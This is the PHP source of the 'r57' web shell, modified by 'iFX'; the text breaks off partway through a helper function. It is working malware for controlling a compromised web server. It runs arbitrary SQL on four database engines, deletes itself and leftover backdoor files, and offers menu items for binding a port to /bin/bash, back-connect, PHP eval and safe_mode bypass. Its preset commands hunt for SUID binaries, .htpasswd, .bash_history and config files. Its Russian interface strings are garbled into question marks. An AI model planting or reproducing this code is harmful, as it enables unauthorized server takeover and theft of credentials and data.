<?php
echo '[syslog]01
'; echo '[syslog]01
'; error_reporting(0); @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0); $sp347c9a = @ini_get('safe_mode'); $sp1968ee = ' ~Alissa~'; if (version_compare(phpversion(), '4.1.0') == -1) { $_POST =& $sp07209c; $_GET =& $spa2d7db; $_SERVER =& $spf69472; } if (@get_magic_quotes_gpc()) { foreach ($_POST as $sp71a197 => $spe2ff4f) { $_POST[$sp71a197] = stripslashes($spe2ff4f); } foreach ($_SERVER as $sp71a197 => $spe2ff4f) { $_SERVER[$sp71a197] = stripslashes($spe2ff4f); } } $spf7117b = 0; $sp19dd0c = ''; $sp83677c = ''; if ($spf7117b == 1) { if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== $sp19dd0c || md5($_SERVER['PHP_AUTH_PW']) !== $sp83677c) { header('WWW-Authenticate: Basic realm="Modified By iFX"'); header('HTTP/1.0 401 Unauthorized'); die('<b><a href=http://lintah-club.ueuo.com>HELLW access denied tau\'!!!, soryy neeh cuy!! :D</a> : Access Denied</b>'); } } $sp9ee6bd = '<!-- ??????????  ???? -->
<html>
<head>
<title>:: The r57 shell with modified by iFX :: listening L\'Arc~en~Ciel - MilkyWay::</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
body,td,th {
color: #00FF00;
}
tr {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #97C296 1px solid;
BORDER-LEFT:   #97C296 1px solid;
BORDER-BOTTOM: #000E6A 1px solid;
}
td {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #97C296 1px solid;
BORDER-LEFT:   #97C296 1px solid;
BORDER-BOTTOM: #000000 1px solid;
}
.table1 {
BORDER-RIGHT:  #333333 0px; 
BORDER-TOP:    #97C296 0px;
BORDER-LEFT:   #97C296 0px;
BORDER-BOTTOM: #333333 0px;
BACKGROUND-COLOR: #000000;
}
.td1 {
BORDER-RIGHT:  #333333 0px;
BORDER-TOP:    #97C296 0px;
BORDER-LEFT:   #97C296 0px;
BORDER-BOTTOM: #333333 0px;
font: 7pt Verdana;
}
.tr1 {

BORDER-RIGHT:  #333333 0px;
BORDER-TOP:    #333333 0px;
BORDER-LEFT:   #333333 0px;
BORDER-BOTTOM: #333333 0px;
}
table {
BORDER-RIGHT:  #97C296 1px outset;
BORDER-TOP:    #97C296 1px outset;
BORDER-LEFT:   #97C296 1px outset;
BORDER-BOTTOM: #97C296 1px outset;
BACKGROUND-COLOR: #004F0A;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #00CA0B 1px solid;
BORDER-LEFT:   #00CA0B 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #004F0A;
font: 8pt Verdana;
color : #FFFFFF;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #00CA0B 1px solid;
BORDER-LEFT:   #00CA0B 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #004F0A;
font: 8pt Verdana;
color:#80DBEE
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #004F0A;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #00CA0B 1px solid;
BORDER-LEFT:   #00CA0B 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #004F0A;
font: Fixedsys bold;
color:#E49F1F;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
background-color: #000000;
}

A:link {COLOR: #97C296; TEXT-DECORATION: none}
A:visited { COLOR: #2BE421; TEXT-DECORATION: none}
A:active {COLOR: #000099; TEXT-DECORATION: none}
A:hover {color: #2FADD7; TEXT-DECORATION: underline}
</STYLE>'; if (isset($_GET['phpinfo'])) { echo @phpinfo(); echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } if ($_POST['cmd'] == 'db_query') { echo $sp9ee6bd; switch ($_POST['db']) { case 'MySQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; } $sp7a8f47 = @mysql_connect('localhost:' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { if (!empty($_POST['mysql_db'])) { @mysql_select_db($_POST['mysql_db'], $sp7a8f47); } $spde30a8 = @explode(';', $_POST['db_query']); foreach ($spde30a8 as $spdaa25b => $spd2724c) { if (strlen($spd2724c) > 5) { echo '<font face=Verdana size=-2 color=green><b>Query#' . $spdaa25b . ' : ' . htmlspecialchars($spd2724c) . '</b></font><br>'; $spfd181b = @mysql_query($spd2724c, $sp7a8f47); $spf785f6 = @mysql_error($sp7a8f47); if ($spf785f6) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>' . $spf785f6 . '</b></font></td></tr></table><br>'; } else { if (@mysql_num_rows($spfd181b) > 0) { $spd6fdb8 = $spabcb3f = $spa22ace = $spe99d03 = ''; while ($spa53ce4 = @mysql_fetch_assoc($spfd181b)) { $spa22ace = @implode('&nbsp;</b></font></td><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = htmlspecialchars($spe2ff4f); } $spe99d03 = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;', $spe99d03); $spd6fdb8 .= '<tr><td><font face=Verdana size=-2>&nbsp;' . $spe99d03 . '&nbsp;</font></td></tr>'; } echo '<table width=100%>'; $spabcb3f = '<tr><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;' . $spa22ace . '&nbsp;</b></font></td></tr>'; $spabcb3f .= $spd6fdb8; echo $spabcb3f; echo '</table><br>'; } else { if (($spb7d784 = @mysql_affected_rows($sp7a8f47)) >= 0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>' . $spb7d784 . '</b></font></td></tr></table><br>'; } } } @mysql_free_result($spfd181b); } } @mysql_close($sp7a8f47); } else { echo '<div align=center><font face=Verdana size=-2 color=red><b>Can\'t connect to MySQL server</b></font></div>'; } break; case 'MSSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; } $sp7a8f47 = @mssql_connect('localhost,' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { if (!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'], $sp7a8f47); } $spde30a8 = @explode(';', $_POST['db_query']); foreach ($spde30a8 as $spdaa25b => $spd2724c) { if (strlen($spd2724c) > 5) { echo '<font face=Verdana size=-2 color=green><b>Query#' . $spdaa25b . ' : ' . htmlspecialchars($spd2724c) . '</b></font><br>'; $spfd181b = @mssql_query($spd2724c, $sp7a8f47); if (@mssql_num_rows($spfd181b) > 0) { $spd6fdb8 = $spabcb3f = $spa22ace = $spe99d03 = ''; while ($spa53ce4 = @mssql_fetch_assoc($spfd181b)) { $spa22ace = @implode('&nbsp;</b></font></td><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = htmlspecialchars($spe2ff4f); } $spe99d03 = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;', $spe99d03); $spd6fdb8 .= '<tr><td><font face=Verdana size=-2>&nbsp;' . $spe99d03 . '&nbsp;</font></td></tr>'; } echo '<table width=100%>'; $spabcb3f = '<tr><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;' . $spa22ace . '&nbsp;</b></font></td></tr>'; $spabcb3f .= $spd6fdb8; echo $spabcb3f; echo '</table><br>'; } @mssql_free_result($spfd181b); } } @mssql_close($sp7a8f47); } else { echo '<div align=center><font face=Verdana size=-2 color=red><b>Can\'t connect to MSSQL server</b></font></div>'; } break; case 'PostgreSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; } $sp6ff357 = 'host=\'localhost\' port=\'' . $_POST['db_port'] . '\' user=\'' . $_POST['mysql_l'] . '\' password=\'' . $_POST['mysql_p'] . '\' dbname=\'' . $_POST['mysql_db'] . '\''; $sp7a8f47 = @pg_connect($sp6ff357); if ($sp7a8f47) { $spde30a8 = @explode(';', $_POST['db_query']); foreach ($spde30a8 as $spdaa25b => $spd2724c) { if (strlen($spd2724c) > 5) { echo '<font face=Verdana size=-2 color=green><b>Query#' . $spdaa25b . ' : ' . htmlspecialchars($spd2724c) . '</b></font><br>'; $spfd181b = @pg_query($sp7a8f47, $spd2724c); $spf785f6 = @pg_errormessage($sp7a8f47); if ($spf785f6) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>' . $spf785f6 . '</b></font></td></tr></table><br>'; } else { if (@pg_num_rows($spfd181b) > 0) { $spd6fdb8 = $spabcb3f = $spa22ace = $spe99d03 = ''; while ($spa53ce4 = @pg_fetch_assoc($spfd181b)) { $spa22ace = @implode('&nbsp;</b></font></td><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = htmlspecialchars($spe2ff4f); } $spe99d03 = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;', $spe99d03); $spd6fdb8 .= '<tr><td><font face=Verdana size=-2>&nbsp;' . $spe99d03 . '&nbsp;</font></td></tr>'; } echo '<table width=100%>'; $spabcb3f = '<tr><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;' . $spa22ace . '&nbsp;</b></font></td></tr>'; $spabcb3f .= $spd6fdb8; echo $spabcb3f; echo '</table><br>'; } else { if (($spb7d784 = @pg_affected_rows($spfd181b)) >= 0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>' . $spb7d784 . '</b></font></td></tr></table><br>'; } } } @pg_free_result($spfd181b); } } @pg_close($sp7a8f47); } else { echo '<div align=center><font face=Verdana size=-2 color=red><b>Can\'t connect to PostgreSQL server</b></font></div>'; } break; case 'Oracle': $sp7a8f47 = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']); if ($spf785f6 = @ocierror()) { echo '<div align=center><font face=Verdana size=-2 color=red><b>Can\'t connect to Oracle server.<br>' . $spf785f6['message'] . '</b></font></div>'; } else { $spde30a8 = @explode(';', $_POST['db_query']); foreach ($spde30a8 as $spdaa25b => $spd2724c) { if (strlen($spd2724c) > 5) { echo '<font face=Verdana size=-2 color=green><b>Query#' . $spdaa25b . ' : ' . htmlspecialchars($spd2724c) . '</b></font><br>'; $spb5bb2c = @ociparse($sp7a8f47, $spd2724c); @ociexecute($spb5bb2c); if ($spf785f6 = @ocierror()) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>' . $spf785f6['message'] . '</b></font></td></tr></table><br>'; } else { $spc48afa = @ocirowcount($spb5bb2c); if ($spc48afa != 0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>' . $spc48afa . '</b></font></td></tr></table><br>'; } else { echo '<table width=100%><tr>'; for ($spc9281a = 1; $spc9281a <= @ocinumcols($spb5bb2c); $spc9281a++) { echo '<td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;' . htmlspecialchars(@ocicolumnname($spb5bb2c, $spc9281a)) . '&nbsp;</b></font></td>'; } echo '</tr>'; while (ocifetch($spb5bb2c)) { echo '<tr>'; for ($spc9281a = 1; $spc9281a <= @ocinumcols($spb5bb2c); $spc9281a++) { echo '<td><font face=Verdana size=-2>&nbsp;' . htmlspecialchars(@ociresult($spb5bb2c, $spc9281a)) . '&nbsp;</font></td>'; } echo '</tr>'; } echo '</table><br>'; } @ocifreestatement($spb5bb2c); } } } @ocilogoff($sp7a8f47); } break; } echo '<form name=form method=POST>'; echo in('hidden', 'db', 0, $_POST['db']); echo in('hidden', 'db_port', 0, $_POST['db_port']); echo in('hidden', 'mysql_l', 0, $_POST['mysql_l']); echo in('hidden', 'mysql_p', 0, $_POST['mysql_p']); echo in('hidden', 'mysql_db', 0, $_POST['mysql_db']); echo in('hidden', 'cmd', 0, 'db_query'); echo '<div align=center><textarea cols=65 rows=10 name=db_query>' . (!empty($_POST['db_query']) ? $_POST['db_query'] : 'SHOW DATABASES;
SELECT * FROM user;') . '</textarea><br><input type=submit name=submit value=" Run SQL query "></div><br><br>'; echo '</form>'; echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } if (isset($_GET['delete'])) { @unlink(@substr(@strrchr($_SERVER['PHP_SELF'], '/'), 1)); } if (isset($_GET['tmp'])) { @unlink('/tmp/bdpl'); @unlink('/tmp/back'); @unlink('/tmp/bd'); @unlink('/tmp/bd.c'); @unlink('/tmp/dp'); @unlink('/tmp/dpc'); @unlink('/tmp/dpc.c'); } if (isset($_GET['phpini'])) { echo $sp9ee6bd; function U_value($spc3da4d) { if ($spc3da4d == '') { return '<i>no value</i>'; } if (@is_bool($spc3da4d)) { return $spc3da4d ? 'TRUE' : 'FALSE'; } if ($spc3da4d === null) { return 'NULL'; } if (@is_object($spc3da4d)) { $spc3da4d = (array) $spc3da4d; } if (@is_array($spc3da4d)) { @ob_start(); print_r($spc3da4d); $spc3da4d = @ob_get_contents(); @ob_end_clean(); } return U_wordwrap((string) $spc3da4d); } function U_wordwrap($sp6ff357) { $sp6ff357 = @wordwrap(@htmlspecialchars($sp6ff357), 100, '<wbr />', true); return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $sp6ff357); } if (@function_exists('ini_get_all')) { $spd6dd63 = ''; echo '<table width=100%>', '<tr><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>'; foreach (@ini_get_all() as $sp8b00ef => $spc3da4d) { $spd6dd63 .= '<tr><td>' . ws(3) . '<font face=Verdana size=-2><b>' . $sp8b00ef . '</b></font></td><td><font face=Verdana size=-2><div align=center><b>' . U_value($spc3da4d['local_value']) . '</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>' . U_value($spc3da4d['global_value']) . '</b></div></font></td></tr>'; } echo $spd6dd63; echo '</table>'; } echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } if (isset($_GET['cpu'])) { echo $sp9ee6bd; echo '<table width=100%><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>'; $sp5c494e = @file('cpuinfo'); if ($sp5c494e) { $sp76d016 = @sizeof($sp5c494e); for ($sp6c3e91 = 0; $sp6c3e91 < $sp76d016; $sp6c3e91++) { $spea4fcd = @explode(':', $sp5c494e[$sp6c3e91]); if ($spea4fcd[1] == '') { $spea4fcd[1] = '---'; } $spd6dd63 .= '<tr><td>' . ws(3) . '<font face=Verdana size=-2><b>' . trim($spea4fcd[0]) . '</b></font></td><td><font face=Verdana size=-2><div align=center><b>' . trim($spea4fcd[1]) . '</b></div></font></td></tr>'; } echo $spd6dd63; } else { echo '<tr><td>' . ws(3) . '<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>'; } echo '</table>'; echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } if (isset($_GET['mem'])) { echo $sp9ee6bd; echo '<table width=100%><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>'; $sp510113 = @file('meminfo'); if ($sp510113) { $sp76d016 = sizeof($sp510113); for ($sp6c3e91 = 0; $sp6c3e91 < $sp76d016; $sp6c3e91++) { $spea4fcd = explode(':', $sp510113[$sp6c3e91]); if ($spea4fcd[1] == '') { $spea4fcd[1] = '---'; } $spd6dd63 .= '<tr><td>' . ws(3) . '<font face=Verdana size=-2><b>' . trim($spea4fcd[0]) . '</b></font></td><td><font face=Verdana size=-2><div align=center><b>' . trim($spea4fcd[1]) . '</b></div></font></td></tr>'; } echo $spd6dd63; } else { echo '<tr><td>' . ws(3) . '<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>'; } echo '</table>'; echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } $sp53bb19 = 'eng'; $spa872db = array('ru_text1' => '??????????? ???????', 'ru_text2' => '?????????? ?????? ?? ???????', 'ru_text3' => '????????? ???????', 'ru_text4' => '??????? ??????????', 'ru_text5' => '???????? ?????? ?? ??????', 'ru_text6' => '????????? ????', 'ru_text7' => '??????', 'ru_text8' => '???????? ?????', 'ru_butt1' => '?????????', 'ru_butt2' => '?????????', 'ru_text9' => '???????? ????? ? ???????? ??? ? /bin/bash', 'ru_text10' => '??????? ????', 'ru_text11' => '?????? ??? ???????', 'ru_butt3' => '???????', 'ru_text12' => 'back-connect', 'ru_text13' => 'IP-?????', 'ru_text14' => '????', 'ru_butt4' => '?????????', 'ru_text15' => '???????? ?????? ? ?????????? ???????', 'ru_text16' => '????????????', 'ru_text17' => '????????? ????', 'ru_text18' => '????????? ????', 'ru_text19' => 'Exploits', 'ru_text20' => '????????????', 'ru_text21' => '????? ???', 'ru_text22' => 'datapipe', 'ru_text23' => '????????? ????', 'ru_text24' => '????????? ????', 'ru_text25' => '????????? ????', 'ru_text26' => '????????????', 'ru_butt5' => '?????????', 'ru_text28' => '?????? ? safe_mode', 'ru_text29' => '?????? ????????', 'ru_butt6' => '???????', 'ru_text30' => '???????? ?????', 'ru_butt7' => '???????', 'ru_text31' => '???? ?? ??????', 'ru_text32' => '?????????? PHP ????', 'ru_text33' => '???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL', 'ru_butt8' => '?????????', 'ru_text34' => '???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include', 'ru_text35' => '???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql', 'ru_text36' => '????', 'ru_text37' => '?????', 'ru_text38' => '??????', 'ru_text39' => '???????', 'ru_text40' => '???? ??????? ???? ??????', 'ru_butt9' => '????', 'ru_text41' => '????????? ? ?????', 'ru_text42' => '?????????????? ?????', 'ru_text43' => '????????????? ????', 'ru_butt10' => '?????????', 'ru_butt11' => '?????????????', 'ru_text44' => '?????????????? ????? ??????????! ?????? ?????? ??? ??????!', 'ru_text45' => '???? ????????', 'ru_text46' => '???????? phpinfo()', 'ru_text47' => '???????? ???????? php.ini', 'ru_text48' => '???????? ????????? ??????', 'ru_text49' => '???????? ??????? ? ???????', 'ru_text50' => '?????????? ? ??????????', 'ru_text51' => '?????????? ? ??????', 'ru_text52' => '????? ??? ??????', 'ru_text53' => '?????? ? ?????', 'ru_text54' => '????? ?????? ? ??????', 'ru_butt12' => '?????', 'ru_text55' => '?????? ? ??????', 'ru_text56' => '?????? ?? ???????', 'ru_text57' => '???????/??????? ????/??????????', 'ru_text58' => '???', 'ru_text59' => '????', 'ru_text60' => '??????????', 'ru_butt13' => '???????/???????', 'ru_text61' => '???? ??????', 'ru_text62' => '?????????? ???????', 'ru_text63' => '???? ??????', 'ru_text64' => '?????????? ???????', 'ru_text65' => '???????', 'ru_text66' => '???????', 'ru_text67' => 'Chown/Chgrp/Chmod', 'ru_text68' => '???????', 'ru_text69' => '????????1', 'ru_text70' => '????????2', 'ru_text71' => '?????? ???????? ???????:
- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) 
- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) 
- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)', 'ru_text72' => '????? ??? ??????', 'ru_text73' => '?????? ? ?????', 'ru_text74' => '?????? ? ??????', 'ru_text75' => '* ????? ???????????? ?????????? ?????????', 'ru_text76' => '????? ?????? ? ?????? ? ??????? ??????? find', 'ru_text77' => '???????? ????????? ???? ??????', 'ru_text78' => '?????????? ???????', 'ru_text79' => '?????????? ???????', 'ru_text80' => '???', 'ru_text81' => '????', 'ru_text82' => '???? ??????', 'ru_text83' => '?????????? SQL ???????', 'ru_text84' => 'SQL ??????', 'ru_text85' => '???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????', 'eng_text1' => 'Sikat..!!', 'eng_text2' => 'Running..di server', 'eng_text3' => 'Jalankan perintah', 'eng_text4' => 'Direktori Skrg', 'eng_text5' => 'Upload files ke server', 'eng_text6' => 'Local file', 'eng_text7' => 'Aliases', 'eng_text8' => 'Select alias', 'eng_butt1' => 'Sikat', 'eng_butt2' => 'Upload', 'eng_text9' => 'Bind port to /bin/bash', 'eng_text10' => 'Port', 'eng_text11' => 'Password untuk', 'eng_butt3' => 'Bind', 'eng_text12' => 'back-connect', 'eng_text13' => 'IP', 'eng_text14' => 'Port', 'eng_butt4' => 'Connect', 'eng_text15' => 'Upload files from remote server', 'eng_text16' => 'With', 'eng_text17' => 'Remote file', 'eng_text18' => 'Local file', 'eng_text19' => 'Exploits', 'eng_text20' => 'Use', 'eng_text21' => '&nbsp;New name', 'eng_text22' => 'datapipe', 'eng_text23' => 'Local port', 'eng_text24' => 'Remote host', 'eng_text25' => 'Remote port', 'eng_text26' => 'Use', 'eng_butt5' => 'Run', 'eng_text28' => 'Work in safe_mode', 'eng_text29' => 'ACCESS DENIED', 'eng_butt6' => 'Change', 'eng_text30' => 'Cat file', 'eng_butt7' => 'Show', 'eng_text31' => 'File not found', 'eng_text32' => 'Eval PHP code', 'eng_text33' => 'Test bypass open_basedir with cURL functions', 'eng_butt8' => 'Test', 'eng_text34' => 'Test bypass safe_mode with include function', 'eng_text35' => 'Test bypass safe_mode with load file in mysql', 'eng_text36' => 'Database', 'eng_text37' => 'Login', 'eng_text38' => 'Password', 'eng_text39' => 'Table', 'eng_text40' => 'Dump database table', 'eng_butt9' => 'Dump', 'eng_text41' => 'Save dump in file', 'eng_text42' => 'Edit files', 'eng_text43' => 'File for edit', 'eng_butt10' => 'Save', 'eng_text44' => 'Can\'t edit file! Only read access!', 'eng_text45' => 'File saved', 'eng_text46' => 'Show phpinfo()', 'eng_text47' => 'Show variables from php.ini', 'eng_text48' => 'Delete temp files', 'eng_butt11' => 'Edit file', 'eng_text49' => 'Delete script from server', 'eng_text50' => 'View cpu info', 'eng_text51' => 'View memory info', 'eng_text52' => 'Find text', 'eng_text53' => 'In dirs', 'eng_text54' => 'Find text in files', 'eng_butt12' => 'Find', 'eng_text55' => 'Only in files', 'eng_text56' => 'Nothing :(', 'eng_text57' => 'Create/Delete File/Dir', 'eng_text58' => 'name', 'eng_text59' => 'file', 'eng_text60' => 'dir', 'eng_butt13' => 'Create/Delete', 'eng_text61' => 'File created', 'eng_text62' => 'Dir created', 'eng_text63' => 'File deleted', 'eng_text64' => 'Dir deleted', 'eng_text65' => 'Create', 'eng_text66' => 'Delete', 'eng_text67' => 'Chown/Chgrp/Chmod', 'eng_text68' => 'Command', 'eng_text69' => 'param1', 'eng_text70' => 'param2', 'eng_text71' => 'Second commands param is:
- for CHOWN - name of new owner or UID
- for CHGRP - group name or GID
- for CHMOD - 0777, 0755...', 'eng_text72' => 'Text for find', 'eng_text73' => 'Find in folder', 'eng_text74' => 'Find in files', 'eng_text75' => '* you can use regexp', 'eng_text76' => 'Search text in files via find', 'eng_text77' => 'Show database structure', 'eng_text78' => 'show tables', 'eng_text79' => 'show columns', 'eng_text80' => 'Type', 'eng_text81' => 'Net', 'eng_text82' => 'Databases', 'eng_text83' => 'Run SQL query', 'eng_text84' => 'SQL query'); $sp488c53 = array('find suid files' => 'find / -type f -perm -04000 -ls', 'find suid files in current dir' => 'find . -type f -perm -04000 -ls', 'find sgid files' => 'find / -type f -perm -02000 -ls', 'find sgid files in current dir' => 'find . -type f -perm -02000 -ls', 'find config.inc.php files' => 'find / -type f -name config.inc.php', 'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php', 'find config* files' => 'find / -type f -name "config*"', 'find config* files in current dir' => 'find . -type f -name "config*"', 'find all writable files' => 'find / -type f -perm -2 -ls', 'find all writable files in current dir' => 'find . -type f -perm -2 -ls', 'find all writable directories' => 'find /  -type d -perm -2 -ls', 'find all writable directories in current dir' => 'find . -type d -perm -2 -ls', 'find all writable directories and files' => 'find / -perm -2 -ls', 'find all writable directories and files in current dir' => 'find . -perm -2 -ls', 'find all service.pwd files' => 'find / -type f -name service.pwd', 'find service.pwd files in current dir' => 'find . -type f -name service.pwd', 'find all .htpasswd files' => 'find / -type f -name .htpasswd', 'find .htpasswd files in current dir' => 'find . -type f -name .htpasswd', 'find all .bash_history files' => 'find / -type f -name .bash_history', 'find .bash_history files in current dir' => 'find . -type f -name .bash_history', 'find all .mysql_history files' => 'find / -type f -name .mysql_history', 'find .mysql_history files in current dir' => 'find . -type f -name .mysql_history', 'find all .fetchmailrc files' => 'find / -type f -name .fetchmailrc', 'find .fetchmailrc files in current dir' => 'find . -type f -name .fetchmailrc', 'list file attributes on a Linux second extended file system' => 'lsattr -va', 'show opened ports' => 'netstat -an | grep -i listen', '----------------------------------------------------------------------------------------------------' => 'ls -la'); $sped9a11 = '<tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: '; $sp2b74d6 = ' ::</div></b></font></td></tr><tr><td>'; $sp873d14 = '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333>'; $spb0d409 = '</td></tr>'; $sp3975e2 = ' <font face=Wingdings color=gray>?</font>'; $sp0558ec = '<font color=black>[</font>'; $spb68bf1 = '<font color=black>]</font>'; $sp262f43 = '<font face=Verdana size=-2>'; $sp65abe9 = '<table class=table1 width=100% align=center>'; $sp8b2f4f = '</table>'; $spea02a2 = '<form name=form method=POST>'; $spdb4689 = '</form>'; if (!empty($_POST['dir'])) { @chdir($_POST['dir']); } $spa25e24 = @getcwd(); $sp3375c3 = 0; $spcc2cff = 0; if (strlen($spa25e24) > 1 && $spa25e24[1] == ':') { $sp3375c3 = 1; } else { $spcc2cff = 1; } if (empty($spa25e24)) { $sp0486f5 = getenv('OS'); if (empty($sp0486f5)) { $sp0486f5 = 'true'; } if (empty($sp0486f5)) { $sp0486f5 = '-'; $spcc2cff = 1; } else { if (@eregi('^win', $sp0486f5)) { $sp3375c3 = 1; } else { $spcc2cff = 1; } } } if (!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == 'search_text') { echo $sp9ee6bd; if (!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sp1dbd45 = new SearchResult($_POST['s_dir'], $_POST['s_text'], $_POST['s_mask']); } else { $sp1dbd45 = new SearchResult($_POST['s_dir'], $_POST['s_text']); } $sp1dbd45->SearchText(0, 0); $spfd181b = $sp1dbd45->GetResultFiles(); $sp16bd78 = $sp1dbd45->GetMatchesCount(); $spbea6e1 = $sp1dbd45->GetTitles(); $spd6dd63 = ''; if ($sp16bd78 > 0) { $spd6dd63 .= '<TABLE width=100%>'; foreach ($spfd181b as $spa3ecf0 => $spe2ff4f) { $spd6dd63 .= '<TR>'; $spd6dd63 .= '<TD colspan=2><font face=Verdana size=-2><b>' . ws(3); $spd6dd63 .= $sp3375c3 ? str_replace('/', '\\', $spa3ecf0) : $spa3ecf0; $spd6dd63 .= '</b></font></ TD>'; $spd6dd63 .= '</TR>'; foreach ($spe2ff4f as $sp5955cc => $sp873f91) { $spd6dd63 .= '<TR>'; $spd6dd63 .= '<TD align=center><B><font face=Verdana size=-2>' . $sp5955cc . '</font></B></TD>'; $spd6dd63 .= '<TD><font face=Verdana size=-2>' . ws(2) . $sp873f91 . '</font></TD>'; $spd6dd63 .= '</TR>
'; } } $spd6dd63 .= '</TABLE>'; echo $spd6dd63; } else { echo '<P align=center><B><font face=Verdana size=-2>' . $spa872db[$sp53bb19 . '_text56'] . '</B></font></P>'; } echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>'; die; } if ($sp3375c3 && !$sp347c9a) { $sp6f9beb = ex('ver'); if (empty($sp6f9beb)) { $sp347c9a = 1; } } else { if ($spcc2cff && !$sp347c9a) { $sp6f9beb = ex('uname'); if (empty($sp6f9beb)) { $sp347c9a = 1; } } } $sp48db21 = getenv('SERVER_SOFTWARE'); if (empty($sp48db21)) { $sp48db21 = '-'; } function ws($sp6c3e91) { return @str_repeat('&nbsp;', $sp6c3e91); } function ex($spdc9908) { $spfd181b = ''; if (!empty($spdc9908)) { if (function_exists('true')) { $spfd181b = join('
